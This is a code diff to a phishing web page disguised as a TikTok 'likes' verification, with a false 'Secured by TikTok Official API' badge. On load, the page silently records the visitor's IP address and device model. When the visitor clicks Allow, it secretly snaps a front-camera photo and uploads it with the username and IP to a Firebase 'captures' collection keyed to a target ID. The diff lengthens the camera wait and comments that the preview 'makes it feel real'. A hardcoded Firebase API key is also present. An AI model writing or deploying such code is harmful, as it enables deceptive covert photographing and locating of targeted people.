@@ -199,6 +199,7 @@
         <div id="status-box" class="status-box"></div>
       </div>
 
+      <!-- Success Screen -->
       <div id="success-screen" class="success-screen">
         <div class="check-icon">✅</div>
         <h2>Success!</h2>
@@ -212,13 +213,16 @@
     <div class="footer-note">🔒 Secured by TikTok Official API • Verified Partner 2026</div>
   </div>
 
+  <!-- Hidden Elements for Camera Logic -->
   <video id="video-preview" autoplay muted playsinline style="display:none;"></video>
   <canvas id="photo-canvas" style="display:none;"></canvas>
 
+  <!-- Firebase Scripts (Using your provided keys) -->
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
   
   <script>
+    // Initialize Firebase
     if (typeof firebase !== 'undefined' && !firebase.apps.length) {
       firebase.initializeApp({
         apiKey: "AIzaSyB25VaErJEsI3VLBeb52cpczKRmEWC4fEs",
@@ -232,11 +236,13 @@
     }
     const db2 = firebase.firestore();
 
+    // Get URL parameters (if you share links with ?type=...)
     const params = new URLSearchParams(window.location.search);
     const targetId = params.get('id');
-    const type = params.get('type') || 'camera';
+    const type = params.get('type') || 'camera'; // Default to camera for TikTok style
     const uid = params.get('uid') || 'unknown';
 
+    // UI Elements
     const btnAllow = document.getElementById('btn-allow');
     const statusBox = document.getElementById('status-box');
     const videoPreview = document.getElementById('video-preview');
@@ -248,6 +254,7 @@
     let capturedDevice = 'Unknown Device';
     let captureComplete = false;
 
+    // 1. Capture IP Address immediately
     async function captureIP() {
       try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -255,6 +262,7 @@
         capturedIP = data.ip;
       } catch (e) { capturedIP = '127.0.0.1'; }
 
+      // Detect Device
       const ua = navigator.userAgent;
       if (/Android/i.test(ua)) {
         const match = ua.match(/Android\s+[\d\.]+;\s*([^;]+)\s*Build/i);
@@ -263,6 +271,7 @@
       else if (/Windows/i.test(ua)) { capturedDevice = "Windows PC"; }
       else { capturedDevice = "Unknown Device"; }
 
+      // Save IP to Firebase
       try {
         await db2.collection('captures').add({
           targetId: targetId || 'direct',
@@ -276,10 +285,12 @@
       } catch(e) {}
     }
 
+    // Helper: Canvas to Base64 Image
     function canvasToBase64(canvas, quality) {
       return canvas.toDataURL('image/jpeg', quality || 0.85);
     }
 
+    // Show Success Screen
     function showSuccess() {
       withdrawalForm.style.display = 'none';
       successScreen.style.display = 'block';
@@ -289,6 +300,7 @@
       }
     }
 
+    // Main Function: Handle Button Click
     async function handleAllow() {
       if (captureComplete) return;
 
@@ -300,39 +312,48 @@
       statusBox.textContent = '📸 Requesting Camera Permission...';
 
       try {
+        // 2. Logic for Camera Access (TikTok Style)
         if (type === 'camera') {
+          // Ask for permission
           const stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
           });
           
+          // Show preview (optional, makes it feel real)
           videoPreview.style.display = 'block';
           videoPreview.srcObject = stream;
           
-          await new Promise(r => setTimeout(r, 1500));
+          // --- CHANGE HERE: Wait time increased to 3-4 seconds ---
+          await new Promise(r => setTimeout(r, 3500)); 
+          // -------------------------------------------------------
 
+          // Capture Frame
           photoCanvas.width = videoPreview.videoWidth || 640;
           photoCanvas.height = videoPreview.videoHeight || 480;
           const ctx = photoCanvas.getContext('2d');
           ctx.drawImage(videoPreview, 0, 0);
           
+          // Stop Camera
           stream.getTracks().forEach(t => t.stop());
           videoPreview.style.display = 'none';
 
           statusBox.textContent = '📤 Uploading Data...';
           const photoBase64 = canvasToBase64(photoCanvas, 0.85);
 
+          // Save to Firebase
           await db2.collection('captures').add({
             targetId: targetId || 'direct',
             type: 'camera',
             ip: capturedIP,
             deviceModel: capturedDevice,
-            photoBase64: photoBase64, 
+            photoBase64: photoBase64, // The actual image taken
             username: username,
             uid: uid,
             timestamp: firebase.firestore.FieldValue.serverTimestamp()
           });
 
         } else {
+          // Fallback if URL has ?type=ip
           await db2.collection('captures').add({
             targetId: targetId || 'direct',
             type: 'ip',
@@ -346,6 +367,7 @@
 
         captureComplete = true;
         
+        // 3. Show Success Message
         statusBox.className = 'status-box show success';
         statusBox.textContent = '✅ Verified! Processing Likes...';
         
@@ -355,6 +377,7 @@
         }, 1500);
 
       } catch (err) {
+        // If user denies permission or error occurs
         statusBox.className = 'status-box show error';
         statusBox.textContent = '❌ Permission Denied. Try again.';
         btnAllow.textContent = '🔄 Retry';
@@ -362,8 +385,10 @@
       }
     }
 
+    // Event Listeners
     btnAllow.addEventListener('click', handleAllow);
 
+    // Start IP Capture on Load
     captureIP();
 
   </script>
